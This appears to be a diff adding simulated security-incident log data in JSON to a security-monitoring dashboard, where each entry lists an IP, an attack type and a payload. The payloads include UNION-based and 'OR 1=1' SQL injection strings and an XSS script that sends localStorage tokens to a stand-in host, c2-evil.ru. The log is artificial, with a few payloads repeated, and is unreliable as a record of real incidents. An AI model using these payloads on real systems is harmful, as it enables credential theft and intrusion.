+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:57:10",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296824858",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:57:04",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296818854",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:56:58",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296814837",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:56:54",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296812835",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:56:52",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296810831",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:56:50",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296806815",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:56:46",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296804808",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:56:44",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296802804",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:56:42",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296800788",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:56:40",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296796772",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:56:36",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296794759",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:56:34",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296792752",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:56:32",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296790740",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:56:30",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296788737",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:56:28",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296786731",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:56:26",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296784727",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:56:24",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296782721",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:56:22",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296780707",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:56:20",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296774689",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:56:14",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296770667",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:56:10",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296764656",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:56:04",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296762641",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:56:02",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296760638",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:56:00",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296756611",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:55:56",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296754607",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:55:54",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296752606",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:55:52",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296750598",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:55:50",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296746586",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:55:46",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296744573",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:55:44",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296738552",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:55:38",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296736544",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:55:36",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296734543",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:55:34",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296730537",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:55:30",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296728526",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:55:28",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296724520",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:55:24",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296722513",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:55:22",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296714495",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:55:14",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296708473",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:55:08",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296704443",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:55:04",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296702428",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:55:02",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296700426",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:55:00",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296696426",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:54:56",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296692420",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:54:52",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296690414",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:54:50",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296684391",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:54:44",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296682376",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:54:42",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296678367",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:54:38",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296674349",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:54:34",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296672346",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:54:32",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296668325",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:54:28",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296666311",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:54:26",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296660289",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:54:20",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296658280",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:54:18",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296656277",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:54:16",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296652265",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:54:12",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296650262",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:54:10",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296648255",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:54:08",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296646246",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:54:06",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296644243",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:54:04",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296642230",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:54:02",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296636214",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:53:56",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296634212",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:53:54",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296630200",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:53:50",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296628194",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:53:48",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296626182",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:53:46",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296618158",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:53:38",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296614153",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:53:34",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296612150",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:53:32",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296600118",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:53:20",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296596116",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:53:16",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296594112",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:53:14",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296592104",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:53:12",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296588087",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:53:08",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296584080",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:53:04",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296580062",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:53:00",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296578055",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:52:58",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296572033",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:52:52",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296564001",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:52:44",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296561999",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:52:41",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296557998",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:52:37",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296553990",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:52:33",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296545960",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:52:25",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296541932",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:52:21",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296535901",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:52:15",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296531883",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:52:11",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296529883",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:52:09",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296527881",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:52:07",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296525876",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:52:05",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296519866",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:51:59",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296515852",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:51:55",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296507833",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:51:47",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296505832",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:51:45",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296503831",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:51:43",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296501823",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:51:41",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296495797",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:51:35",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296493792",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:51:33",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296491785",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:51:31",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296489781",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:51:29",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296487769",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:51:27",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296485765",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:51:25",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296483752",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:51:23",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296481738",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:51:21",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296475721",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:51:15",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296473721",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:51:13",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791296469690",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:51:09",
